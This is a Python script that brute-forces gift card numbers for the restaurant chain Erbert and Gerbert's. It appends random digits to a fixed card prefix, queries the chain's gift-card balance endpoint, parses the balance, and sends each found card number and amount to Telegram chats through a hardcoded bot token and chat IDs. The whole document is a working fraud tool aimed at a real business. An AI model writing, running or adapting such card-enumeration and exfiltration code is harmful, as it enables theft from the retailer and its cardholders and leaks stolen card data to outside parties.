import requests as re
import string
import random as ran
#d = input("Enter gc")
#17805000049400
#178050000xxxxx
f = 0
i = 0
while i == f:
  rando = (''.join(ran.choices(string.digits, k = 5)))
  res = re.get("https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber=178050000" +str(rando))
  if "Error" not in res.text:
   rep = res.text.split("$")
   rep1 = rep[1].strip()
   rep3 = rep1.split("</p>")
   rep4 = rep3[0].strip()
   print("ERBERT AND GERBERTS GC")
   gcf = "★Giftcard ~ 178050000"+rando
   ama = "★Amount ~ $"+rep4
   if (rep4 == "0.00"):
    hit = ("『ꪜ』SAYONARA 『ꪜ』\n ≈ERBERT AND GERBERTS GC HIT≈\n"+gcf+"\n"+ama)
    i = i+1
    re.get('https://api.telegram.org/bot5086523690:AAGkxLN_KxRV4Hl_AXWfxsviXq9i3J9vlb0/sendMessage?chat_id=-1001737896124&text='+hit)
    re.get('https://api.telegram.org/bot5086523690:AAGkxLN_KxRV4Hl_AXWfxsviXq9i3J9vlb0/sendMessage?chat_id=1154075796&text='+hit)
  else:
     print("BAD 178050000"+rando)
